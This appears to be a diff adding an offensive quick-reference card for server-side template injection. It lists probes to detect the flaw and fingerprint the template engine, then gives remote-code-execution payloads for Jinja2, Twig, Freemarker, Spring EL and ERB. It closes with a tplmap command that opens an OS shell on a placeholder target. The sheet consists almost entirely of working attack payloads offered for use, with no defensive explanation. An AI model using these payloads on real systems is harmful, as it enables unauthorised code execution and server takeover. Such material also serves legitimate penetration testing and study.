@@ -1,0 +1,11 @@
+SSTI — QUICK REF
+
+1. Detect:     {{7*7}} ${7*7} <%=7*7%> #{7*7}  → 49 = SSTI
+2. Fingerprint:{{7*'7'}} → 7777777 Jinja2 | 49 Twig ; ${7*7} Freemarker ; <%=%> ERB
+3. RCE:
+   Jinja2   {{cycler.__init__.__globals__.os.popen('id').read()}}
+   Twig     {{['id']|filter('system')}}
+   Freemark <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+   SpringEL ${T(java.lang.Runtime).getRuntime().exec('id')}
+   ERB      <%= `id` %>
+Tool: tplmap -u "http://<target>/?name=X" --os-shell
